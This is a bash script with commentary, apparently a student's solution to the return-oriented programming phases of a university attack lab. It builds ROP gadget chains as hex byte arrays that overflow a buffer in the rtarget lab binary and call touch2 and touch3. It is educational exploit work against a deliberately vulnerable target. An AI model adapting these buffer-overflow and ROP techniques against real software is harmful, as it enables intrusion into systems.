#! /usr/bin/bash
### RETURN-ORIENTED PROGRAMMING (ROP)
# Script automating rtarget inputs; just like ctarget, but w/ randomized, NX stack.

# MUST NOT CONTAIN: 0x0a (\n) at any intermediate position. hex val of 0 is 00.
# ordering of byte feeding should be reversed (little-endian)
# USE ONLY FIRST 8 REGISTERS RAX-RDI, AND ONLY movq popq ret nop

### Phase 4: Level 2. PASS.  touch2 address is 0x00000000004017ec
# gadget chain to set rdi to cookie 0x59b997fa, goto touch2().

# farm has the following instructions in its pieces:
# popq %rax 58 90 c3 with nop, in addval_219, 5th byte, address 0x4019ab; 
# movl %eax, %edi.    89 c7 c3 as below, 4th byte, addr 0x4019a3
# movq %rax, %rdi. 48 89 c7 c3 , 3rd byte addval_273 addr 0x4019a2

# The address to the first gadget overwrites the return address stack location
# which contained the return to test() once getbuf() finishes. Since getbuf()
# allocated 40 bytes on the stack for the buffer, those 40 were just overwritten
# with NOP, so that the 8 after are the address of the first gadget. The cookie
# value which the first gadget needs to pop off to rax is thus at bytes 48 onward
# in the buffer. Once popped off, the next 8 bytes at 56 onward are the next gadget
# address which the first gadget returns to and pops off with the ret. this gadget
# moves the contents of rax to rdi, an activity away from memory, and then returns
# to the next retaddr which rests on the stack, written in bytes 64 onwards. this
# address points to touch()


array_rtouch2=(	'90 90 90 90 90 90 90 90'		# buffer starts here
				'90 90 90 90 90 90 90 90'
				'90 90 90 90 90 90 90 90'
				'90 90 90 90 90 90 90 90'
				'90 90 90 90 90 90 90 90'		# buffer ends here
				'ab 19 40 00 00 00 00 00'		# return address for getbuf here
				'fa 97 b9 59 00 00 00 00'		# writing here corrupts the stack
				'a3 19 40 00 00 00 00 00'		# -//-
				'ec 17 40 00 00 00 00 00'		# -//-
				)

# echo -e -n ${array_rtouch2[*]}>rexploit.txt
# ./hex2raw < rexploit.txt > rexploit_raw.txt  ;  gdb rtarget
# ./hex2raw < rexploit.txt | ./rtarget -q


### Phase 5: Level 3. touch3 address 00000000004018fa
# can use all gadgets. may have functional nops. Soln needs 8 gadgets, not all unique 
# invoke touch3 with ptr to string of cookie. 35 39 62 39 39 37 66 61 00, somewhere
# in buffer overflow. rdi is set to address of string prior to calling touch3().


# Proposal 1 (NO):  pass / fail msgs have the passed buffer bytes stored; find ptr to it
# Proposal 2 (NO): Get() may be called by gadgets at exact rsp as before, but this time
# save its pointer? It would need to be called with a suitable buffersize value which 
# would be overlaid on where the earlier buffer was.

# ASIDE:grep to collect keywords? objdump -d rtarget | grep -C 3 "val_" | grep -C 2 "89"


array_rtouch3=(	'90 90 90 90 90 90 90 90'	# BUFFER STARTS
				'90 90 90 90 90 90 90 90'
				'90 90 90 90 90 90 90 90'
				'90 90 90 90 90 90 90 90'
				'90 90 90 90 90 90 90 90'	# BUFFER ENDS AT 40 BYTES
				'06 1a 40 00 00 00 00 00'	# movq rsp rax
				'c5 19 40 00 00 00 00 00'	# movq rax rdi
				'ab 19 40 00 00 00 00 00'	# popq rax
				'50 00 00 00 00 00 00 00'	# offset... 80 bytes. 72 if str not sandwitched with 00s
				'dd 19 40 00 00 00 00 00'	# movl eax edx
				'34 1a 40 00 00 00 00 00'	# movl edx ecx
				'13 1a 40 00 00 00 00 00'	# movl ecx esi
				'd6 19 40 00 00 00 00 00'	# add_xy: lea (rdi rsi 1), rax
				'c5 19 40 00 00 00 00 00'	# movq rax rdi
				'fa 18 40 00 00 00 00 00'	# call touch3()
				'00 00 00 00 00 00 00 00'
				'35 39 62 39 39 37 66 61'	# COOKIE STRING
				'00 00 00 00 00 00 00 00'
				)

echo -e -n ${array_rtouch3[*]}>rexploit.txt

./hex2raw < rexploit.txt > rexploit_raw.txt 

# gdb rtarget

./hex2raw < rexploit.txt | ./rtarget -q





### DISCUSSION: 

# examine farm asmcode. Interestingly, this disasembly is not useful for this task.
# This is because the farm asmcode has been compiled very differently from the way
# it was done by the task designers. As the assembly was on this machine, and from
# C source code, to objcode, to disassembled asm, every function in the farm has 
# a prologue, epilogue, which includes saving of %rbp and stack management, and 
# the use of endbr64 protection in addition. This is unlike when asm was explicitly
# written, assembled to objcode and then disassembled to examine bytes.
# gcc -c farm.c ; objdump -d farm.o > farm.d

# Confusion with Phase 4 / Level 2, first ROP task:
# The misunderstanding - why I stored all needed gadget addresses to be popped off
# early in the first 40 bytes of the buffer - is due to a confusion of how the
# stack grows, and how this is visualized in gdb. The virtual space for a program
# goes from 0x0 to some 0xMAX; the STACK GROWS DOWN TOWARDS DECREASING ADDRESSES.
# Thus, pushing decrements the address, and popping increments it. 
# This caused no confusion in the code injection tasks because the executable code
# in the buffer is stepped through as %rip increments through instruction bytes.
# But with return-oriented programming, it must be noted that the gadget addresses
# resting on the stack will be popped off by ret, and any data interleaved with the 
# gadget addresses may also need to be popped off; in both cases, this means ++%rsp.

# However, when gdb prints out a list of memory/content, it naturally prints out
# increasing addresses DOWNWARDS, meaning that as bytes are pushed on the stack, 
# into DECREASING addresses, the stack appears to grow UPWARDS on the command prompt.
# Given that I was working on the code injection tasks with the assumption that it 
# was the reverse, my solution of shoving the string in an address unaffected by 
# hexmatch had the effect of corrupting the stack. How did it even execute completely?
# Does the program just exit?
# Additionally, the execution of the code injected in the stack was not an issue because
# it was placed in consecutively increasing addresses, which is how %rip proceeds
# through the control flow.

# Phase 5 / Level 2 
# The easy solution has been prevented. The task of a gets() function is to obtain
# the input for which a buffer has been allocated, and to provide the pointer to where
# the string is on the stack. But its getbuf() wrapper overwrites eax with 1, erasing
# this ptr. Otherwise, the solution would've been to place the string at the start of 
# the buffer, save its pointer from rax to elsewhere, then pass it to rdi before touch3
# is called.

# Solution designed without needing GDB analysis.

# Key: recognizing that one entire farm function could be used; add_xy, as a gadget.
# The rest was identifying proper combination of popq, movl, movq to transfer the
# rsp and offset into separate registers, load them to rdi rsi operands for add_xy
# and then set that result to be in rdi before calling touch3(). After the gadgets,
# stored offset value, have been properly interweaved, and touch3() called, the string
# is placed at an appropriate position in the passed string.
